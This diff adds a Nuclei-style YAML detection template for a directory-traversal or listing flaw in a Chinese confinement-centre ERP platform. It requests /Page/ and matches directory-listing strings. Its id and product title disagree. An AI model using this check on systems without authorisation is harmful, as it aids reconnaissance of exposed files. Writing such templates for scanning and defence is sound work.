@@ -1,0 +1,23 @@
+id: poc-yaml-jintongfang-erp-page-directory-traversal
+info:
+  name: 月子会所ERP管理云平台 Page 目录遍历漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: directory-traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Page/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[To Parent Directory]"
+          - "<dir&gt"
+          - "BasicInfo"
+          - "UploadBaseFolder"
